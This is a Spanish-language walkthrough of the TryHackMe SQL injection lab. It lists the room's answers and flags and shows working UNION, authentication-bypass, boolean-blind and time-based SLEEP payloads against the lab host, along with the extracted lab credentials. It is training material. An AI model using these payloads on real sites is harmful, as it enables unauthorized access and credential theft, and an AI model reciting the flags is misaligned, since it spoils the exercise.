
https://tryhackme.com/r/room/sqlinjectionlm


## Task 1 Brief

### What does SQL stand for?
		Structured Query Language


## Task 2 - What is a Database?

### What is the acronym for the software that controls a database?  

	dbms

### What is the name of the grid-like structure which holds the data?
	table


## Task 3 What is SQL?

### What SQL statement is used to retrieve data?  

	 select

### What SQL clause can be used to retrieve data from multiple tables?  

	 union

### What SQL statement is used to add data?

	insert


## Task 4 - What is SQL Injection?

### What character signifies the end of an SQL query?

	;

## Task 5 - In-Band SQLi


### What is the flag after completing level 1?

	THM{SQL_INJECTION_3840}

#### Generamos el error
```
https://website.thm/article?id=1'
select * from article where id = 1'

SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

#### Encontramos el no de columas adecuado con UNION

```
https://website.thm/article?id=1 union select 1

SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns

```

- son 3
```
https://website.thm/article?id=1 union select 1,2,3
```

#### Una consulta que no produzca resultados
- ponemos en 0 el id, asi podremos ver mas datos en la pagina, 

```
https://website.thm/article?id=0 union select 1,2,3

2
Article ID: 1
3

```

#### Sacamos el nombre de la base de datos

```
https://website.thm/article?id=0 union select 1,2,database()

2
Article ID: 1
sqli_one

```

#### Ahora sacamos el nombre de todas las tablas, concatenado con group_concat

```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

2
Article ID: 1
article,staff_users

```

#### Los campos de la tabla

```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

2
Article ID: 1
id,password,username

```

#### Sacamos todos los users de la tabla

```
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

2
Article ID: 1
admin:p4ssword
martin:pa$$word
jim:work123
```


```
THM{SQL_INJECTION_3840}
```

## Task 6 - Blind SQLi - Authentication Bypass

### What is the flag after completing level two? (and moving to level 3)

	THM{SQL_INJECTION_9581}

#### Tenemos la consulta original

```
`select * from users where username='%username%' and password='%password%' LIMIT 1;`
```

#### Iyectar para bypass del login

```
username: admin
password: ' OR 1=1;--

select * from users where username='admin' and password='' OR 1=1;--' LIMIT 1;

```

#### Obtenemos la flag

```
THM{SQL_INJECTION_9581}
```

#### Task 7 Blind SQLi - Boolean Based

`select * from users where username = '%username%' LIMIT 1;`

#### Intentamos adivinar el numero de columnas, son 3

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1;-- 
{"taken":false}

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;-- 
{"taken":true}
```

#### Intentamos adivinar el nombre de la base de datos
```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like '%';--
{"taken":true}

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 's%';--
{"taken":true}



https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sqli_three%';--
{"taken":true}
```

- descubrimos: `sql_three`
#### Intentamos adivinar el nombre de las tablas

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
{"taken":false}


https://website.thm/checkuser?username=aadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
{"taken":true}
```
- descubrimos: `users`
#### Intentamos adivinar el nombre de los campos

```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
{"taken":false}

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'username%';
{"taken":true}

```
- descubrimos: `username`
#### Intentamos obtener nombres de usuarios
```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'a%
{"taken":true}

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username like 'admin
{"taken":true}

```

#### Intentamos adivinar el password
```
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
{"taken":false}

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3845


```
- encontramos : `3845`
#### vamos a loguernos con : `admin` y `3845`

- obtenemos la flag
`THM{SQL_INJECTION_1093}`


## Task 8 Blind SQLi - Time Based

### What is the final flag after completing level four?

#### Tratamos de averiguar el numero de columnas

```
https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5);--
Request Time: 0.001

https://website.thm/analytics?referrer=aadmin123' UNION SELECT SLEEP(5),2;--
Request Time: 5.001
```

#### Tratamos de averiguar la base de datos

```
https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli%';--
Request Time: 5.002

https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four%';--
Request Time: 5.002

```

#### Tratamos de averiguar las tablas

```

https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name='users';--
Request Time: 5.006
```

#### Intentamos adivinar el nombre de los campos
```
https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'username';--

Request Time: 5.004

```

#### Intentamos obtener nombres de usuarios

```
https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin';--
Request Time: 5.004
```

#### Intentamos adivinar el password

```
https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password like '3%';--

https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password like '4961%';--

```

#### Nos logueamos con: `admin` y `4961`

```
THM{SQL_INJECTION_MASTER}
```

## Task 9 - Out-of-Band SQLi

### Name a protocol beginning with D that can be used to exfiltrate data from a database.

	DNS

## Task 10- Remediation